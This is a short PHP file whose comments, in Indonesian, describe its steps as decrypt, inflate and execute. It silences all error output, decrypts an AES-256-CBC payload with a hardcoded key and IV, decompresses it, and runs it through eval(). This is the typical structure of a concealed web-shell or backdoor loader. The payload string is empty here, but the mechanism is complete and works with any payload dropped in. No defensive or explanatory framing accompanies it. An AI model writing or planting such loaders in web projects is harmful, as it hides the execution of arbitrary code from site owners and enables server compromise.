<?php
error_reporting(0);
ini_set('display_errors', 0);

$k = 'elv@engine123456789';
$i = hex2bin('66306361393832383366623065326666');
$p = '';

// Dekripsi -> Ekstrak (Inflate) -> Eksekusi
$d = openssl_decrypt($p, 'AES-256-CBC', $k, 0, $i);
if ($d !== false) {
    $c = @gzinflate($d);
    if ($c !== false) {
        eval($c);
    }
}
